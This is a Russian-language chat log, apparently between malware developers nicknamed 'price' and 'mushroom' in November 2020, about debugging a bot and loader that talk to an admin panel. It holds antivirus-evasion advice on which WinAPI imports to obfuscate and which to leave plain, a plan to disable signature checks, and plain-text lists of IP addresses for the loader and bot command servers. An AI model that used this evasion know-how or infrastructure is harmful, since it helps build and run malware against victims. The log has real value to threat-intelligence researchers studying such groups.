2020-11-11 08:54:43.254155	price	mushroom	да
2020-11-11 08:54:59.018621	mushroom	price	Может подписи нету там?
2020-11-11 08:55:14.331515	price	mushroom	он все время работал в боте, его перенес в лоадер и вот сейчас он отвалился.
2020-11-11 08:55:30.590632	price	mushroom	буду пробовать опять в боте. Или заменю его на другой
2020-11-11 08:55:54.031177	price	mushroom	он на ранних этапах --ещё до подписи не доходит дело
2020-11-11 08:55:58.168239	mushroom	price	А подпись есть?
2020-11-11 08:56:22.755313	price	mushroom	BCryptImportKeyPair
2020-11-11 08:56:34.936006	price	mushroom	с админки?
2020-11-11 08:56:39.955382	price	mushroom	всё есть
2020-11-11 08:57:05.437859	mushroom	price	Она проверяется?
2020-11-11 08:57:07.564706	price	mushroom	я разберусь, у меня впроблемы нет-это общий перетряс
2020-11-11 08:57:31.351212	price	mushroom	админка? Да с нее 200 приходит и всё что надо
2020-11-11 08:58:14.390471	mushroom	price	Подпись проверяется ключём?
2020-11-11 08:58:34.722825	price	mushroom	да, приватным
2020-11-11 08:58:41.386243	price	mushroom	1014 байта
2020-11-11 08:58:44.239427	price	mushroom	104
2020-11-11 08:59:01.201618	price	mushroom	блин. публичным
2020-11-11 09:01:10.818599	price	mushroom	
ты мне лучше подскажи как typedef сделать для функции  typedef int(WINAPI* user32wsprintfA_)(LPSTR, LPCSTR, va_list arglist);
2020-11-11 09:01:22.918984	price	mushroom	этот не проходит поскольку у функции прототип
2020-11-11 09:01:35.330173	price	mushroom	точечки
2020-11-11 09:01:36.059372	price	mushroom	int WINAPIV wsprintfA(
  LPSTR  ,
  LPCSTR ,
  ...    
);
2020-11-11 09:02:31.616274	price	mushroom	я хочу через getprocaddress получить и ссылаться на эту функцию и не могу протайпдефить её
2020-11-11 09:03:08.873049	price	mushroom	у похожей функции там арглист стоит
2020-11-11 09:03:11.194949	price	mushroom	int wvsprintfA(
  LPSTR   ,
  LPCSTR  ,
  va_list arglist
);
2020-11-11 09:04:13.042182	mushroom	price	С точками не знаю.
2020-11-11 09:04:45.138793	price	mushroom	это последняя функция которая у меня в symbols осталась
2020-11-11 09:04:59.178800	price	mushroom	может оставить симболом?
2020-11-11 09:06:19.571706	mushroom	price	Такие функции не нужно обфусцировать.
2020-11-11 09:06:47.174599	mushroom	price	Можешь перестараться и будет подозрительно для антивируса выглядеть это.
2020-11-11 09:07:44.016088	price	mushroom	а какие нужно? я тожэ так думал. Что слишком вылизано -100% указатель на зловредность
2020-11-11 09:08:34.159160	price	mushroom	а каков критерий - кого из Импорта вычищать
2020-11-11 09:10:04.059308	mushroom	price	Подозрительные типа всё что в Wininet, связанное с процессами, шифрованием и т.д.
2020-11-11 09:11:48.262060	mushroom	price	Я не обфусцирую строковое функции, и функции HeapAlloc, HeapFree. Если что надо закрыть CloaseHandle и это было открыто обфусцированной функцией, то CloseHadle тоже надо обфусцировать.
2020-11-11 09:12:09.321990	mushroom	price	Если нет, не надо. Так будет не подозрительно.
2020-11-11 09:13:55.911030	price	mushroom	я вспомнил почему я через ссылку реализовывал-чтобы аналог sprintf - wsprintfA получить
2020-11-12 08:16:18.853522	mushroom	price	Привет. Ну что?
2020-11-12 08:18:22.379470	price	mushroom	по криптеру нашел причину (переменная функции была нулём, вместо bcrypt попытка закачки из crypt32)
2020-11-12 08:18:51.748836	mushroom	price	Проверил все команды?
2020-11-12 08:19:25.295547	price	mushroom	но потом при выходе из крипты в цикле пишет какието исключения. Правда сейчас туда не доходит может быть прокладки сменились
2020-11-12 08:20:37.692366	mushroom	price	loader
195.123.243.19 
 45.148.120.184 
 195.123.243.20 

bot
 85.204.116.179 
66.85.173.10
2020-11-12 08:20:55.441157	mushroom	price	Сколько ещё будешь проверять?
2020-11-12 08:20:58.495500	price	mushroom	пошел проверять команды
2020-11-12 08:21:06.615297	price	mushroom	ну за сегодня проверю
2020-11-12 08:22:00.883940	mushroom	price	Мне, бинарник загрузчика потом пришли когда проверишь. В боевой версии (Release_nologs).
2020-11-12 08:22:16.904945	price	mushroom	ок
2020-11-12 09:48:23.189773	mushroom	price	Поменяй адреса ботов:
loader
195.123.243.19 
 45.148.120.184 
 195.123.243.20 

bot
 34.239.246.132 
54.196.129.197
2020-11-12 09:48:38.826969	price	mushroom	спасибо
2020-11-12 12:57:36.530270	price	mushroom	привет
2020-11-12 12:58:06.136324	price	mushroom	что-то нет коннекта с группой prtest  по ботам
2020-11-12 12:58:23.622910	price	mushroom	ошибка 12029 cannot connect
2020-11-12 12:58:42.977812	price	mushroom	может что сменилось (порт, например)?
2020-11-12 12:59:47.932607	price	mushroom	а по лоадерам нет верификации подписи, как ни крутил софт, который на старой админке работал как часы (без подписи дальше всё работает)
2020-11-12 13:00:52.296131	price	mushroom	по ботам вот здесь нет коннекта 	BOOL bSend = HttpSendRequestA(hRequest, cookies, icookieslen, NULL, 0);
2020-11-12 13:02:10.534112	price	mushroom	Cookie: group = prtest
2020-11-12 13:02:41.404397	mushroom	price	А вчера был? Подпись вчера проверялась?
2020-11-12 13:03:12.148536	price	mushroom	вчера я до этого места не доходил
2020-11-12 13:04:17.527889	price	mushroom	но код весь на месте, который рабочий был. Просто вместо Импортных функций поставил адреса на на WinApi
2020-11-12 13:05:01.858910	price	mushroom	hfymit ujdjhbkb xnj ytn dthbabrfwbb b ldbufqcz lfdkmit? xnj z b cltkfk ctqxfc
2020-11-12 13:05:38.847535	price	mushroom	с верификацией ещё ладно, раньше говорили нет и двигайся дальше
2020-11-12 13:05:43.945514	mushroom	price	А позавчера?
2020-11-12 13:05:53.357394	price	mushroom	а вот с ботом - проблема
2020-11-12 13:06:39.865314	price	mushroom	я давно изменил имена функции на ссылки на эти функции и копался с отладкой, запусков не было
2020-11-12 13:07:30.095891	price	mushroom	сейчас попробую поискать версию до перехода на ссылки, подставлю айпишки и попробую
2020-11-12 13:07:43.153025	price	mushroom	но с боттами то что?
2020-11-12 13:08:26.638837	mushroom	price	Проверь подпись.
2020-11-12 13:09:59.886340	price	mushroom	там на проверке и вылетает вот тут     NTSTATUS status = bcryptBCryptVerifySignature(m_key, NULL, hash, hashSize, sign, signSize, 0);
2020-11-12 13:10:24.830785	price	mushroom	до этого момента всё отследил как передаётся
2020-11-12 13:10:59.542708	price	mushroom	статус STATUS_INVALID_SIGNATURE
2020-11-12 13:11:12.206275	price	mushroom	чтото с подписью
2020-11-12 13:11:57.302951	mushroom	price	Ключ наверное сменился. Значит проверку подписи отключи пока.
2020-11-12 13:12:05.730113	mushroom	price	Всё остальное проверь.
2020-11-12 13:12:13.898816	price	mushroom	то же думаю
2020-11-12 13:12:32.556300	price	mushroom	но остальное это холовинг на бота. а бот не отрабатывает
2020-11-12 13:12:41.756951	price	mushroom	может тоже чтото сменилось?
2020-11-12 13:13:31.687313	price	mushroom	короче, я теперь отлаживаю бота. Лоадер кроме подписи вроде работает
2020-11-12 13:13:33.679133	mushroom	price	У бота тоже отклбчи проверку подписи.
2020-11-12 13:14:58.840876	price	mushroom	ок
2020-11-13 08:42:27.282349	mushroom	price	Привет. Как тестирование?
2020-11-13 08:42:44.516964	price	mushroom	во всю идет
2020-11-13 08:43:21.550730	price	mushroom	[11:39:32] <PRICE> привет. Сказали, что ты - опытный консультант. 
[11:39:57] <van> Привет! ))) 
[11:40:17] <PRICE> у меня бот получает команду 0 302 с куками Cookie: group = prtest 
[11:40:31] <PRICE> а в админке ничего в списке ботов нет. Что может быть? 
[11:40:43] <PRICE> прокладки верифицировались. 
[11:41:08] <PRICE> работаю через ВПН - американский 
[11:41:58] <PRICE> раньше на старой админке прога работала нормально, ничего в ней не изменял 
[11:42:13] <PRICE> только паблик ключ для верификации 
[11:42:26] <PRICE> ну и адреса прокладок 
[11:42:37] <van> группа есть такая prtest? Открыта? 
[11:42:56] <van> если получил 302 - у тебя всё нормально 
[11:43:02] <PRICE> а как открыть, да она в админке есть в списке групп
2020-11-13 08:43:57.553889	price	mushroom	а с лоадером - всё в порядке
2020-11-13 08:44:07.031604	price	mushroom	восстановилась функциональность
2020-11-13 08:46:32.063987	price	mushroom	бот отлаживаю
2020-11-13 08:47:00.490238	price	mushroom	грин и ван помогают советами (грин снимает блокировки, даёт прокладки)
2020-11-13 08:47:24.113263	mushroom	price	Ну да. Он все адреса даёт.
2020-11-13 08:47:50.055853	price	mushroom	он ещёё может в логах смотреть по коннектам
2020-11-13 08:47:58.960471	price	mushroom	у меня все коннекты есть, а отстука нет
2020-11-13 08:48:02.051892	price	mushroom	я волнуюсь
2020-11-13 08:49:49.115493	price	mushroom	да, ещё мне гит и новый чат сделали
2020-11-13 08:50:24.403612	price	mushroom	но отстука нет
2020-11-13 08:51:11.712256	mushroom	price	Сейчас на своём боте проверю.
2020-11-13 08:51:25.451781	mushroom	price	В новом чате давай ник свой.
2020-11-13 08:51:30.500025	price	mushroom	во-основные силы подоспели!
2020-11-13 08:51:37.343805	mushroom	price	Там будем общаться.
2020-11-13 08:52:20.082171	price	mushroom	marlin
2020-11-13 08:53:23.003340	mushroom	price	Написал тебе.
2020-11-13 08:53:41.995997	price	mushroom	как рояль?
2020-11-13 08:53:49.320832	mushroom	price	Да.
2020-11-13 08:54:00.420049	mushroom	price	Ответь.
2020-11-13 08:54:01.437513	price	mushroom	а ггде читать?
2020-11-13 08:54:47.118084	price	mushroom	не видно ничего
2020-11-13 09:16:07.312232	mushroom	price	Там настраивают что то на сервере.
2020-11-13 09:17:18.974336	mushroom	price	У тебя чат работает?
2020-11-13 09:31:40.606582	price	mushroom	этот -да
2020-11-13 09:31:47.953225	price	mushroom	все чаты рабочие
2020-11-13 09:32:54.359107	mushroom	price	У меня не работал.
2020-11-13 09:33:20.486507	price	mushroom	пятница, 13
2020-11-13 09:33:59.246794	mushroom	price	Да.
2020-11-13 09:34:13.974924	mushroom	price	Основной чат теперь тот, этот говорят палевный.
2020-11-13 09:34:17.244261	price	mushroom	буза отстучался в роккете
2020-11-13 09:34:29.550971	price	mushroom	он -серебряный
2020-11-13 09:34:39.915729	mushroom	price	Да.
2020-11-13 09:36:26.324281	price	mushroom	там даже альфонс есть какой-то
